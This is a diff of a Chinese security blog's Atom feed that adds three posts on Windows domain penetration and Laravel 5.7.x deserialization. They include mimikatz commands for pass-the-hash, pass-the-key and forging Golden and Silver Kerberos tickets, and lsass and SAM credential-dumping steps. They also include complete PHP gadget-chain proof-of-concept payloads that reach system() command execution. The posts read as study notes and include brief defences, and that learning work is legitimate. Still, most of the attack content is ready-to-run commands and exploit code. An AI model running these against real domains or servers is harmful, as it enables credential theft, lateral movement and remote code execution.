@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://chriskalix.github.io</id>
     <title>chriskali&apos;s blog</title>
-    <updated>2020-06-21T13:50:27.541Z</updated>
+    <updated>2020-06-26T09:06:40.979Z</updated>
     <generator>https://github.com/jpmonette/feed</generator>
     <link rel="alternate" href="https://chriskalix.github.io"/>
     <link rel="self" href="https://chriskalix.github.io/atom.xml"/>
@@ -10,6 +10,714 @@
     <logo>https://chriskalix.github.io/images/avatar.png</logo>
     <icon>https://chriskalix.github.io/favicon.ico</icon>
     <rights>All rights reserved 2020, chriskali&apos;s blog</rights>
+    <entry>
+        <title type="html"><![CDATA[域渗透基础知识(二)-PTH&PTT]]></title>
+        <id>https://chriskalix.github.io/post/hPs3dwq1p/</id>
+        <link href="https://chriskalix.github.io/post/hPs3dwq1p/">
+        </link>
+        <updated>2020-06-26T08:16:51.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="pth">PTH</h2>
+<blockquote>
+<p>内网中，经常需要抓取管理员密码(NTLM Hash)。PTH是一种不需要账户明文密码就能完成认证的一个技术。尤其是在域环境下，能帮助我们扩大战果</p>
+</blockquote>
+<h3 id="必须条件">必须条件</h3>
+<ol>
+<li>网络互达(这个有点多余，不互达怎么做)</li>
+<li>需要用户名</li>
+<li>需要NTLM Hash</li>
+</ol>
+<p>问题1：为什么需要用户名？<br>
+答案：看一下NTLM协议，第一步就是传输用户名</p>
+<p>问题2：如何使用NTLMv1/NTLMv2或者net NTLM进行HASH传递攻击？<br>
+答案：这些都不行，只有NTLM Hash</p>
+<h3 id="通常pth的渗透方式">通常PTH的渗透方式</h3>
+<ul>
+<li>获取一台域内主机的权限</li>
+<li>Dump内存获取用户HASH</li>
+<li>通过PTH尝试登录其他主机</li>
+<li>继续收集HASH并尝试远程登录</li>
+<li>直到获取域管理员HASH，最终成果控制整个域</li>
+</ul>
+<h3 id="现实情况">现实情况</h3>
+<blockquote>
+<p>会有补丁，策略等等，以下列出两种</p>
+</blockquote>
+<h4 id="对抗补丁">对抗补丁</h4>
+<p>KB2871997（被称为PTH杀手），是微软在2014年5月13号推出的补丁，当时的标题为&quot;Update to fix the Pass-The-Hash Vulnerability&quot;，一周后改为&quot;Update to improve credentials protection and management&quot;<br>
+使得本地账号不能再用于远程接入系统，这样就无法以本地管理员用户执行wmi、PSEXEC、schtasks、at和文件访问。然而，administrator用户仍能够PTH，这里是SID为500的用户，默认名为administrator，即使改名了，SID还是不会改变<br>
+所以从防御视角来说，即使打了补丁，还要禁用SID=500的管理员用户</p>
+<h4 id="laps">LAPS</h4>
+<p>LAPS即Local Administrator Password Solution，是微软推出的本地密码管理方案。解决了域内主机本地管理员密码相同的问题。</p>
+<h3 id="操作命令">操作命令</h3>
+<blockquote>
+<p>这里其实本地搭建一个域环境会理解的比较深刻，我之前搭建了，系统重装后忘记保存，暂时没有</p>
+</blockquote>
+<h4 id="使用ntlm-hash进行pth攻击">使用NTLM Hash进行PTH攻击</h4>
+<blockquote>
+<p>此方法在KB2871997后收到限制，只能用SID=500的账户进行PTH操作</p>
+</blockquote>
+<p><code>mimikatz &quot;privileges::debug&quot; &quot;&quot;sekurlsa::pth /user:administrator /domain::pentest.com /ntlm:xxxxx</code></p>
+<h4 id="aes-256进行pth攻击ptk">AES-256进行PTH攻击(PTK)</h4>
+<blockquote>
+<p>此方法针对的是打上了KB2871997的机器（猜测就是为啥微软一周后就改名了），又叫<code>Pass The Key</code></p>
+</blockquote>
+<ol>
+<li>mimikatz抓取AES-256密钥<br>
+<code>mimikatz &quot;privilege::debug&quot; &quot;sekurlsa::ekeys&quot;</code></li>
+<li><code>mimikatz &quot;privileges::debug&quot; &quot;&quot;sekurlsa::pth /user:administrator /domain::pentest.com /aes256:xxxxx</code></li>
+</ol>
+<h3 id="pth的其他场景">PTH的其他场景</h3>
+<p>在<a href="https://www.secpulse.com/archives/105503.html">这篇文章</a>中我看到了其他场景。Restricted Admin Mode，开启这个模式后，默认可以用凭证登录</p>
+<p><code>privilege::debug sekurlsa::pth /user:administrator /domain:remoteserver /ntlm:d25ecd13fddbb542d2e16da4f9e0333d &quot;/run:mstsc.exe /restrictedadmin&quot;</code></p>
+<h2 id="ptt">PTT</h2>
+<blockquote>
+<p>PTT，Pass The Ticket即票据传递攻击。<br>
+cs中<br>
+<code>kerberos_ccache_use 从ccache文件中导入票据应用于此会话 kerberos_ticket_purge 清除当前会话的票据 kerberos_ticket_use 从ticket文件中导入票据应用于此会话</code></p>
+</blockquote>
+<h3 id="golden-ticket黄金票据">Golden Ticket黄金票据</h3>
+<blockquote>
+<p>该票据的利用条件是原先已成功取得域用户(krbtgt)的HASH这个用户的。由于某些原因导致在控域网络失控，失去域管理员权限。现在你还有一个普通域用户权限，管理员在加固时没有重置krbtgt密码（非常常见），在此条件下，我们还能利用该票据重新获得域管理员权限</p>
+</blockquote>
+<p>相当于可以自己造TGT</p>
+<h4 id="前提条件">前提条件</h4>
+<ul>
+<li>域名称</li>
+<li>域SID</li>
+<li>域krbtgt的hash（意味着你已经有域控权限）</li>
+<li>伪造的用户名（任意用户或者不存在的用户）</li>
+</ul>
+<h4 id="具体操作">具体操作</h4>
+<ol>
+<li>
+<p>提取域用户kgbtgt的NTLM Hash<br>
+<code>lsadump::dcsync /domain:hacker.com /user:krbtgt</code>或者上个文章提到的方法</p>
+</li>
+<li>
+<p>查看域内所有用户的hash<br>
+<code>lsadump::dcsync /domain:yangdc.com /all /csv</code></p>
+</li>
+<li>
+<p>获取域SID<br>
+<code>whoami /all</code></p>
+</li>
+<li>
+<p>生成票据<br>
+方法1： AES256</p>
+<p><code>kerber::golden /domain:{域名称} /sid:{sid} /aes256:{AES-256_hmac} /user:{伪造的用户名} /ticket:{名称}.kribi</code></p>
+<p>方法2：NTLM Hash</p>
+<p><code>kerber::golden /domain:{域名称} /sid:{sid} /rc4:ntlm-hashvlaue /user:{伪造的用户名} /ticket:{名称}.kribi</code></p>
+<p><code>mimikatz &quot;kerberos::golden /domain:{域名} /sid:{域SID} /rc4:{KRBTGT NTLM Hash} /user:{任意用户} /ptt&quot; exit</code></p>
+</li>
+</ol>
+<h4 id="防御">防御</h4>
+<ol>
+<li>经常更换KRBTGT密码</li>
+<li>不允许域管账户登录其他服务器</li>
+</ol>
+<h3 id="silver-ticket白银票据">Silver Ticket白银票据</h3>
+<blockquote>
+<p>白银票据(Silver Tickets)是伪造Kerberos票证授予服务（TGS）的票也称为服务票据。所以没有与域控制器通信</p>
+</blockquote>
+<h4 id="前提条件-2">前提条件</h4>
+<ul>
+<li>域名称</li>
+<li>域的SID</li>
+<li>域中Server服务器账户的NTLM-Hash</li>
+<li>伪造任意的用户名</li>
+</ul>
+<h4 id="具体操作-2">具体操作</h4>
+<ol>
+<li>导出hash<br>
+<code>mimikatz log &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords&quot;</code></li>
+<li>生成ticket<br>
+<code>mimikatz &quot;kerberos::golden /domain:{域名} /sid:{域SID} /target:{目标服务器主机名} /service:{服务类型} /rc4:{NTLM Hash} /user:{用户名} /ptt&quot; exit Silver Ticket 生成时指定了相关的服务名，因此只能用来访问相对应的服务，因此局限性比较大</code></li>
+</ol>
+<h4 id="防御-2">防御</h4>
+<p>PAC</p>
+<h2 id="参考文章">参考文章</h2>
+<p><a href="http://www.vuln.cn/6813">乌云文章</a><br>
+<a href="https://xz.aliyun.com/t/7051">先知文章</a></p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[域渗透基础知识(一)-Windows认证]]></title>
+        <id>https://chriskalix.github.io/post/e3nr4E66U/</id>
+        <link href="https://chriskalix.github.io/post/e3nr4E66U/">
+        </link>
+        <updated>2020-06-26T08:14:38.000Z</updated>
+        <content type="html"><![CDATA[<blockquote>
+<p>主要包含本地认证，网络认证，域认证</p>
+</blockquote>
+<h2 id="windows本地认证">Windows本地认证</h2>
+<p>简述流程：当登录系统时候，用户的密码会被加密成NTLM Hash，再通过与SAM数据库中用户的哈希（<code>%SystemRoot%\system32\config\sam</code>）进行匹配从而完成校验。</p>
+<h3 id="认证流程">认证流程</h3>
+<p>简易图：<br>
+<img src="https://chriskalix.github.io/post-images/1593159324969.png" alt="" loading="lazy"></p>
+<p>提到的<strong>NTLM Hash</strong>，是一种单向哈希算法。顺便记一下，Windows中不以明文形式进行传输和存储。算法的流程如下：</p>
+<p><code>hex编码 -&gt; Unicode编码 -&gt; MD4</code></p>
+<p>简单地用py做个HASH：</p>
+<figure data-type="image" tabindex="1"><img src="https://chriskalix.github.io/post-images/1593159333529.png" alt="" loading="lazy"></figure>
+<blockquote>
+<p><code>NTLM Hash</code>的前身为<code>LM Hash</code>，存在于<code>Windows Server 2008</code>之前版本，由于安全性被淘汰</p>
+</blockquote>
+<p>经常我们听到用mimikatz抓密码这个操作，其实就是从<code>lsass.exe</code>这个进程中读取到的</p>
+<h3 id="抓取密码">抓取密码</h3>
+<blockquote>
+<p>这一过程需要system，毕竟访问的是<code>lsass.exe</code></p>
+</blockquote>
+<h4 id="用procdump-mimikatz">用Procdump + Mimikatz</h4>
+<p>mimikatz都听过，但是不做免杀就是冲锋兵，没落地就被吃了。那怎么办，可以用微软自带的<a href="https://docs.microsoft.com/en-us/sysinternals/downloads/procdump">Procdump</a>，命令如下：<br>
+<code>procdump64.exe -accepteula -ma lsass.exe lsass.dmp</code><br>
+然后再脱到本地，用<code>mimikatz</code>跑一下<br>
+<code>mimikatz.exe &quot;sekurlsa::minidump lsass.dmp&quot; &quot;sekurlsa::logonPasswords full&quot; exit</code></p>
+<h4 id="无工具直接抓取">无工具直接抓取</h4>
+<p>直接通过reg的save选项保存<br>
+<code>reg save hklm\sam sam.hive</code><br>
+<code>reg save hklm\system system.hive</code></p>
+<p>然后拖到本地，mimikatz跑<br>
+<code>lsadump::sam /sam:sam.hive /system:system.hive</code></p>
+<p>问题：为什么有时候看到能抓明文，有时候又是抓NTLM Hash？</p>
+<p>答案：默认Win10或者win server 2012r2以上的，禁止在内存中保存明文密码(WDigest策略)，所以有时候需要明文密码的时候，就需要Hook winlogon程序，然后开启WDigest等待对方登录。</p>
+<h2 id="windows网络认证">Windows网络认证</h2>
+<p>工作组环境下远程登录另外一台设备所采用的认证机制。常见的如SMB</p>
+<h3 id="ntlm协议">NTLM协议</h3>
+<p>分为三步骤</p>
+<ol>
+<li>协商</li>
+<li>质询</li>
+<li>验证</li>
+</ol>
+<h4 id="1-协商">1. 协商</h4>
+<p>协商认证版本（NTLM v1/NTLM v2）</p>
+<h4 id="2-质询">2. <strong>质询</strong></h4>
+<p>**挑战（Chalenge）/响应（Response）**认证机制。步骤如下：</p>
+<ol>
+<li>客户端向服务端发送用户信息（用户名）请求</li>
+<li>服务端接受到请求，生成一个16位的随机数，成为&quot;Challenge&quot;，服务端查询用户名所对应的NTLM Hash，用该哈希加密&quot;Challeng&quot;，保存至内存中，称之为&quot;Challeng1&quot;，之后再将&quot;Challenge&quot;发送至客户端</li>
+<li>客户端收到&quot;Chanlleng&quot;后，同样的使用自己的NTLM Hash，对&quot;Challenge&quot;进行加密比对，生成Response传递给客户端</li>
+</ol>
+<p>其中NTLM Hash加密Challenge的结果，在协议中称为Net NTLM Hash</p>
+<h4 id="3-验证">3. 验证</h4>
+<p>客户端收到上述的Response，与内存中的Chanllenge1进行比对，完成验证</p>
+<h2 id="域认证kerberos">域认证（Kerberos）</h2>
+<p>Kerberos 是一种网络认证协议，其设计目标是通过密钥系统为客户机 / 服务器应用程序提供强大的认证服务。该认证过程的实现不依赖于主机操作系统的认证，无需基于主机地址的信任，不要求网络上所有主机的物理安全，并假定网络上传送的数据包可以被任意地读取、修改和插入数据。在以上情况下， Kerberos 作为一种可信任的第三方认证服务，是通过传统的密码技术（如：共享密钥）执行认证服务的。</p>
+<p>域认证所包含的角色有：</p>
+<ul>
+<li>Client</li>
+<li>Server</li>
+<li>KDC(Key Distribution Centor) = DC</li>
+</ul>
+<h3 id="详细流程">详细流程</h3>
+<p>流程图如下所示：<br>
+<img src="https://chriskalix.github.io/post-images/1593159403049.png" alt="" loading="lazy"></p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[Laravel 5.7.x反序列化链分析]]></title>
+        <id>https://chriskalix.github.io/post/xpSoAzZun/</id>
+        <link href="https://chriskalix.github.io/post/xpSoAzZun/">
+        </link>
+        <updated>2020-06-26T08:02:56.000Z</updated>
+        <content type="html"><![CDATA[<blockquote>
+<p>前段时间电脑重装后忘记备份了，从环境开始</p>
+</blockquote>
+<h2 id="环境预备">环境预备</h2>
+<h3 id="准备工具">准备工具</h3>
+<ol>
+<li>PHPStudy - PHP 7.1.9</li>
+<li>composer</li>
+<li>VSCODE(调试)</li>
+</ol>
+<h3 id="安装">安装</h3>
+<ol>
+<li>设置源 ：<code>composer config -g repo.packagist composer https://mirrors.aliyun.com/composer/</code></li>
+<li>安装Laravel ：<code>composer create-project laravel/laravel Laravel --prefer-dist &quot;5.7.*&quot;</code></li>
+</ol>
+<h2 id="开始调试">开始调试</h2>
+<blockquote>
+<p>比赛前没有看过Laravel框架，比赛的时候很慌乱，到处找链，发现入口点都是一样的，但是被堵死了</p>
+</blockquote>
+<h3 id="laravel-57x反序列化链一">Laravel 5.7.x反序列化链(一)</h3>
+<h4 id="设置反序列化入口点">设置反序列化入口点</h4>
+<p>先往<code>app/Http/Controllers/</code>下添加<code>TaskController.php</code>文件，内容为</p>
+<pre><code class="language-php">&lt;?php
+namespace App\Http\Controllers;
+class TaskController 
+{ 
+public function index(){
+    if(isset($_GET['p'])){
+        unserialize($_GET['p']);    
+    } 
+    return &quot;There is an param names p (get)&quot;; 
+    } 
+} 
+?&gt;
+</code></pre>
+<p>在<code>routes/web.php</code>下添加路由</p>
+<pre><code class="language-php">Route::get('/index', 'TaskController@index');
+</code></pre>
+<p>访问<code>localhost/Laravel/public/index</code>，返回<code>There is an param names p (get)</code>证明成功</p>
+<h4 id="反序列化入口点">反序列化入口点</h4>
+<p>网上能找到的，如<code>CVE-2019-9081</code>，大多反序列的入口点为<code>vendor/laravel/framework/src/illuminate/Foundation/Testing/PendingCommand.php</code>，中的<code>PendingCommand</code>类，提取出相关的函数点，如下：</p>
+<pre><code class="language-php">class PendingCommand
+{
+	public $test;
+	protected $app;
+	protected $command;
+	protected $parameters;
+	protected $expectedExitCode;
+	protected $hasExecuted = false;
+	...
+    public function run()
+    {
+    	...
+    }
+    ...
+    public function __destruct()
+    {
+        if ($this-&gt;hasExecuted) {
+            return;
+        }
+
+        $this-&gt;run();
+    }
+}
+</code></pre>
+<h4 id="继续跟进">继续跟进</h4>
+<p>默认调用了<code>$this-&gt;run()</code>，继续跟进<code>run()</code>下的代码</p>
+<pre><code class="language-php">    /**
+     * Execute the command.
+     *
+     * @return int
+    */
+   public function run()
+    {
+        $this-&gt;hasExecuted = true;
+        $this-&gt;mockConsoleOutput();
+        try {
+            $exitCode = $this-&gt;app[Kernel::class]-&gt;call($this-&gt;command, $this-&gt;parameters);
+        } catch (NoMatchingExpectationException $e) {
+            if ($e-&gt;getMethodName() === 'askQuestion') {
+                $this-&gt;test-&gt;fail('Unexpected question &quot;'.$e-&gt;getActualArguments()[0]-&gt;getQuestion().'&quot; was asked.');
+            }
+            throw $e;
+        }
+        if ($this-&gt;expectedExitCode !== null) {
+            $this-&gt;test-&gt;assertEquals(
+                $this-&gt;expectedExitCode, $exitCode,
+                &quot;Expected status code {$this-&gt;expectedExitCode} but received {$exitCode}.&quot;
+            );
+        }
+        return $exitCode;
+    }
+</code></pre>
+<p>为什么看到<code>run</code>方法比较兴奋，因为上面注释写着<code>execute the command</code>，一看就是有执行的样子。但是先调用了该类的<code>mockConsoleOutput</code>方法，继续跟进查看，这边构造的时候注意<code>$app</code>的类问题，在该文件中有注释<code>* @param \Illuminate\Foundation\Application $app</code>。该类在文件<code>vendor/laravel/framework/src/illuminate/Foundation/Application.php</code>下</p>
+<pre><code class="language-php">protected function mockConsoleOutput()
+{
+    $mock = Mockery::mock(OutputStyle::class.'[askQuestion]', [
+        (new ArrayInput($this-&gt;parameters)), $this-&gt;createABufferedOutputMock(),
+    ]);
+
+    foreach ($this-&gt;test-&gt;expectedQuestions as $i =&gt; $question) {
+        $mock-&gt;shouldReceive('askQuestion')
+            -&gt;once()
+            -&gt;ordered()
+            -&gt;with(Mockery::on(function ($argument) use ($question) {
+                return $argument-&gt;getQuestion() == $question[0];
+            }))
+            -&gt;andReturnUsing(function () use ($question, $i) {
+                unset($this-&gt;test-&gt;expectedQuestions[$i]);
+
+                return $question[1];
+            });
+    }
+
+    $this-&gt;app-&gt;bind(OutputStyle::class, function () use ($mock) {
+        return $mock;
+    });
+}
+</code></pre>
+<p>看到<code>foreach</code>那行，因为<code>test</code>可控，所以该函数可以调用任意类下的<code>__get</code>。全局搜索，还是有挺多的，网上的文章不同的大部分在这里开支，有使用<code>Illuminate\Auth\GenericUser</code>类的，也有使用<code>Faker\DefaultGenerator</code>类的。这边挑取<code>Faker\DefaultGenerator</code>进行跟进分析</p>
+<h4 id="链子1">链子1</h4>
+<p>找到文件<code>vendor/fzaninotto/faker/src/Faker/DefaultGenerator.php</code>，如下：</p>
+<pre><code class="language-php">class DefaultGenerator
+{
+    protected $default;
+
+    public function __construct($default = null)
+    {
+        $this-&gt;default = $default;
+    }
+    public function __get($attribute)
+    {
+        return $this-&gt;default;
+    }
+    public function __call($method, $attributes)
+    {
+        return $this-&gt;default;
+    }
+}
+
+</code></pre>
+<p>跟先知文章走，到这里先自己构造一遍</p>
+<pre><code class="language-php">&lt;?php
+
+namespace Illuminate\Foundation\Testing {
+	class PendingCommand {
+		public $test;
+		protected $app;
+		protected $command;
+		protected $parameters;
+
+		public function __construct($test,$app,$command,$parameters) {
+			$this-&gt;test = $test;
+			$this-&gt;app = $app;
+			$this-&gt;command = $command;
+			$this-&gt;parameters = $parameters;
+		}
+	}
+}
+
+namespace Faker {
+	class DefaultGenerator {
+		protected $default;
+		public function __construct($default = null) {
+			$this-&gt;default = $default;
+		}
+	}
+}
+
+namespace Illuminate\Foundation {
+	class Application {
+		public function __construct() {
+		}
+	}
+}
+
+namespace {
+	$c = new Faker\DefaultGenerator(array(&quot;1&quot;=&gt;&quot;1&quot;));
+	$b = new Illuminate\Foundation\Application();
+	$a = new Illuminate\Foundation\Testing\PendingCommand($c, $b, 'system', array('whoami'));
+	echo urlencode(serialize($a));
+}
+</code></pre>
+<p>给<code>PendingCommand</code>传的不是array，会报如下错误<br>
+<img src="https://chriskalix.github.io/post-images/1593158937485.png" alt="" loading="lazy"></p>
+<h4 id="关键函数">关键函数</h4>
+<p>继续跟进到</p>
+<pre><code class="language-php">$exitCode = $this-&gt;app[Kernel::class]-&gt;call($this-&gt;command, $this-&gt;parameters);
+</code></pre>
+<p>这时候需要认真看，因为调到这里的时候报错了。首先先看一下app是什么，在代码里的注释有，如下：</p>
+<pre><code class="language-php">/**
+ * The application instance.
+ *
+ * @var \Illuminate\Foundation\Application
+ */
+protected $app;
+</code></pre>
+<p>其实就是<code>\Illuminate\Foundation\Application</code>下的类，<code>Kernel::class</code>其实就是字符串<code>Illuminate\Contracts\Console\Kernel</code>，这里讲起来比较绕，直接上图。</p>
+<figure data-type="image" tabindex="1"><img src="https://chriskalix.github.io/post-images/1593158913879.png" alt="" loading="lazy"></figure>
+<pre><code class="language-php">&lt;?php
+
+namespace Illuminate\Foundation\Testing {
+	class PendingCommand {
+		public $test;
+		protected $app;
+		protected $command;
+		protected $parameters;
+
+		public function __construct($test,$app,$command,$parameters) {
+			$this-&gt;test = $test;
+			$this-&gt;app = $app;
+			$this-&gt;command = $command;
+			$this-&gt;parameters = $parameters;
+		}
+	}
+}
+
+namespace Faker {
+	class DefaultGenerator {
+		protected $default;
+		public function __construct($default = null) {
+			$this-&gt;default = $default;
+		}
+	}
+}
+
+namespace Illuminate\Foundation{
+    class Application{
+        protected $instances = [];
+        public function __construct($instances = [])
+        {
+            $this-&gt;instances['Illuminate\Contracts\Console\Kernel'] = $instances;
+        }
+    }
+}
+
+namespace {
+	$d = new Faker\DefaultGenerator(array(&quot;1&quot;=&gt;&quot;1&quot;));
+	$c = new Illuminate\Foundation\Application();
+	$b = new Illuminate\Foundation\Application($c);
+	$a = new Illuminate\Foundation\Testing\PendingCommand($d, $b, 'system', array('whoami'));
+	echo urlencode(serialize($a));
+}
+</code></pre>
+<p>最后POC如上，就是和先知那个文章一样了，照着跟的，不过这个CVE其实有版本限制</p>
+<h3 id="laravel反序列化链二">Laravel反序列化链（二）</h3>
+<blockquote>
+<p>这个链子是群里奶权师傅的0day，链子十分神奇，属实太强了。不是我的不是我的不是我的，是奶权的，是奶权的，是奶权的。</p>
+</blockquote>
+<h4 id="反序列化入口点-2">反序列化入口点</h4>
+<p>入口点文件在<code>vendor/swiftmailer/swiftmailer/lib/classes/Swift/ByteSteam/TemporaryFileByteStream.php</code>的<code>Swift_ByteStream_TemporaryFileByteStream</code>类</p>
+<figure data-type="image" tabindex="2"><img src="https://chriskalix.github.io/post-images/1593158964510.png" alt="" loading="lazy"></figure>
+<p>跟到<code>vendor/swiftmailer/swiftmailer/lib/classes/Swift/ByteStream/FileByteStream.php</code>的<code>Swift_ByteStream_FileByteStream</code>下的<code>getpath()</code></p>
+<pre><code class="language-php">public function getPath()
+{
+    return $this-&gt;path;
+}
+</code></pre>
+<p>这里可控，且<code>file_exists</code>所以触发任意类的 <code>__toString()</code></p>
+<h4 id="继续跟进-2">继续跟进</h4>
+<p><code>vendor/laravel/framework/src/Illuminate/View/View.php</code> 下的<code>__toString()</code></p>
+<pre><code class="language-php">public function __toString()
+{
+    return $this-&gt;render();
+}
+</code></pre>
+<p>跟到<code>render</code>函数</p>
+<pre><code class="language-php">public function render(callable $callback = null)
+{
+    try {
+        $contents = $this-&gt;renderContents();
+
+        $response = isset($callback) ? call_user_func($callback, $this, $contents) : null;
+
+        // Once we have the contents of the view, we will flush the sections if we are
+        // done rendering all views so that there is nothing left hanging over when
+        // another view gets rendered in the future by the application developer.
+        $this-&gt;factory-&gt;flushStateIfDoneRendering();
+
+        return ! is_null($response) ? $response : $contents;
+    } catch (Exception $e) {
+        $this-&gt;factory-&gt;flushState();
+
+        throw $e;
+    } catch (Throwable $e) {
+        $this-&gt;factory-&gt;flushState();
+
+        throw $e;
+    }
+}
+</code></pre>
+<p>虽然<code>try</code>出现了<code>call_user_func</code>，但是<code>$callback</code>是空的，可以看到<code>$this-&gt;factory-&gt;flushStateIfDoneRendering();</code> 是可控的，可以触发任意类 <code>__call()</code>，作为跳板继续跟进。在<code>vendor/fzaninotto/faker/src/Faker/Generator.php</code>下</p>
+<pre><code class="language-php">public function __call($method, $attributes)
+{
+    return $this-&gt;format($method, $attributes);
+}
+</code></pre>
+<p>继续跟进</p>
+<pre><code class="language-php">public function format($formatter, $arguments = array())
+{
+    return call_user_func_array($this-&gt;getFormatter($formatter), $arguments);
+}
+</code></pre>
+<p>这里只有<code>$formatter</code>是可控的，跟进<code>getFormatter</code>，得到如下</p>
+<pre><code class="language-php">public function getFormatter($formatter)
+{
+    if (isset($this-&gt;formatters[$formatter])) {
+        return $this-&gt;formatters[$formatter];
+    }
+    foreach ($this-&gt;providers as $provider) {
+        if (method_exists($provider, $formatter)) {
+            $this-&gt;formatters[$formatter] = array($provider, $formatter);
+
+            return $this-&gt;formatters[$formatter];
+        }
+    }
+    throw new \InvalidArgumentException(sprintf('Unknown formatter &quot;%s&quot;', $formatter));
+}
+</code></pre>
+<p><code>getformatter</code>中的<code>return $this-&gt;formatters[$formatter]</code>，因为<code>$formatters</code>与<code>$formatter</code>均可控，所以这里调用任意类的任意方法，但是由于<code>format</code>方法中的<code>$arguements</code>为空，不能对函数进行传参</p>
+<h4 id="执行点">执行点</h4>
+<blockquote>
+<p>这个地方我觉得是最神奇的，我看着poc写分析过程的时候到这有点卡住了。后来看了奶权师傅的分析文章才明白，这个地方确实很神奇</p>
+</blockquote>
+<p>可用函数点为<code>/vendor/fzaninotto/faker/src/Faker/VaildGenerator.php</code>下的<code>__call</code>函数中，如下：</p>
+<pre><code class="language-php">public function __call($name, $arguments)
+{
+    $i = 0;
+    do {
+        $res = call_user_func_array(array($this-&gt;generator, $name), $arguments);
+        $i++;
+        if ($i &gt; $this-&gt;maxRetries) {
+            throw new \OverflowException(sprintf('Maximum retries of %d reached without finding a valid value', $this-&gt;maxRetries));
+        }
+    } while (!call_user_func($this-&gt;validator, $res));
+
+    return $res;
+}
+</code></pre>
+<p>首先<code>$res = call_user_func_array(array($this-&gt;generator, $name), $arguments);</code>获取<code>$res</code>返回值，然后走到<code>while</code>里的<code>call_user_func</code>进行执行，do while会先进去，再到while分支的，继续寻找能控制返回值的（且不需要输入参数）的函数。</p>
+<p>在<code>vendor/phpunit/php-token-stream/src/Token/Stream.php</code> 中找到</p>
+<pre><code class="language-php">public function getFilename()
+{
+    return $this-&gt;filename;
+}
+</code></pre>
+<p>那么到这里利用链就分析完毕，这里写上POC，POC也是看着奶权写的，都是奶哥的，我负责复现5555555</p>
+<pre><code class="language-php">&lt;?php
+namespace {
+    class PHP_Token_Stream {
+        protected $filename;
+        public function __construct() {
+            $this-&gt;filename = &quot;whoami&quot;;
+        }
+    }
+}
+
+namespace Faker {
+    use PHP_Token_Stream;
+    class ValidGenerator {
+        protected $generator;
+        protected $validator; // while (!call_user_func($this-&gt;validator, $res));
+        protected $maxRetries; // if ($i &gt; $this-&gt;maxRetries)执行一次，所以设定为2就行
+        public function __construct() {
+            $this-&gt;generator = new PHP_Token_Stream;
+            $this-&gt;validator = &quot;system&quot;;
+            $this-&gt;maxRetries = 2;
+        }
+    }
+    class Generator {
+        protected $formatters = array();
+        public function __construct() {
+            $this-&gt;formatters['flushState'] = [new ValidGenerator, &quot;getFilename&quot;];
+        }
+    }
+}
+
+namespace Illuminate\View {
+    use Faker\Generator;
+    class View {
+        protected $factory;
+        public function __construct() {
+            $this-&gt;factory = new Generator;
+        }
+    }
+}
+
+namespace {
+    use Illuminate\View\View;
+    class Swift_ByteStream_FileByteStream {
+        private $path;
+        public function __construct() {
+            $this-&gt;path = new View;
+        }
+    }
+
+    class Swift_ByteStream_TemporaryFileByteStream extends Swift_ByteStream_FileByteStream {
+    }
+
+    $a = new Swift_ByteStream_TemporaryFileByteStream;
+    echo urlencode(serialize(new Swift_ByteStream_TemporaryFileByteStream));
+}
+</code></pre>
+<h4 id="反序列化链三">反序列化链（三）</h4>
+<p>这里就不继续分析了，换了一个入口点进入<code>run()</code>，比赛的时候没注意哈哈哈，老老实实地复现跟踪</p>
+<pre><code class="language-php">&lt;?php
+//gadgets.php
+namespace Illuminate\Foundation\Testing{
+    class PendingCommand{
+        protected $command;
+        protected $parameters;
+        protected $app;
+        public $test;
+
+
+        public function __construct($command, $parameters,$class,$app)
+{
+            $this-&gt;command = $command;
+            $this-&gt;parameters = $parameters;
+            $this-&gt;test=$class;
+            $this-&gt;app=$app;
+        }
+    }
+}
+
+
+namespace Illuminate\Auth{
+    class GenericUser{
+        protected $attributes;
+        public function __construct(array $attributes){
+            $this-&gt;attributes = $attributes;
+        }
+    }
+}
+
+
+
+
+namespace Illuminate\Foundation{
+    class Application{
+        protected $hasBeenBootstrapped = false;
+        protected $bindings;
+
+
+        public function __construct($bind){
+            $this-&gt;bindings=$bind;
+        }
+    }
+}
+
+
+namespace Symfony\Component\Routing\Loader\Configurator{
+    class CollectionConfigurator
+    {
+        public $parent;
+        public $collection;
+        public $prefixes;
+
+
+        public function __construct($parent)
+{
+            $this-&gt;prefixes=1;
+            $this-&gt;parent=$parent;
+            $this-&gt;collection=new \Symfony\Component\Routing\RouteCollection(array(&quot;12end&quot;=&gt;&quot;12end&quot;));
+        }
+    }
+}
+
+
+namespace Faker{
+    class ValidGenerator
+    {
+        protected $generator;
+        protected $validator;
+        protected $maxRetries;
+
+
+        public function __construct($validator)
+{
+            $this-&gt;generator = new \Symfony\Component\Routing\RouteCollection(array(&quot;12end&quot;=&gt;&quot;12end&quot;));
+            $this-&gt;validator = $validator;
+            $this-&gt;maxRetries = 10;
+        }
+    }
+}
+
+
+namespace Symfony\Component\Routing{
+    class RouteCollection{
+
+
+    }
+}
+?&gt;
+</code></pre>
+<h2 id="参考">参考</h2>
+<p><a href="https://xz.aliyun.com/t/5483">先知文章-反序列化链1</a></p>
+]]></content>
+    </entry>
     <entry>
         <title type="html"><![CDATA[Golang踩坑集锦]]></title>
         <id>https://chriskalix.github.io/post/DRstRdo9d/</id>
@@ -1024,136 +1732,6 @@ $data   = &quot;&lt;?php\n//&quot; . sprintf('%012d', $expire) . &quot;\n exit()
 <li>windows下写poc的tips1，（感谢osword小刀师傅），写入&lt;?exp.php，相当于exp.php，另外一个https://xz.aliyun.com/t/7310。自行更改后即可~</li>
 <li>要找一个有写入权限的目录</li>
 </ol>
-]]></content>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[Thinkphp 6.x(小于6.0.2)不安全的sessionid分析]]></title>
-        <id>https://chriskalix.github.io/post/thinkphp-6xxiao-yu-602bu-an-quan-de-sessionid-fen-xi/</id>
-        <link href="https://chriskalix.github.io/post/thinkphp-6xxiao-yu-602bu-an-quan-de-sessionid-fen-xi/">
-        </link>
-        <updated>2020-06-14T04:05:26.000Z</updated>
-        <content type="html"><![CDATA[<h2 id="前言">前言</h2>
-<p>2020-01-10，thinkphp的github上更新了一处对sessionid检查的一处隐患<br>
-<img src="https://chriskalix.github.io/post-images/1592107642955.png" alt="" loading="lazy"><br>
-更新代码段如下<br>
-<img src="https://chriskalix.github.io/post-images/1592107658091.png" alt="" loading="lazy"><br>
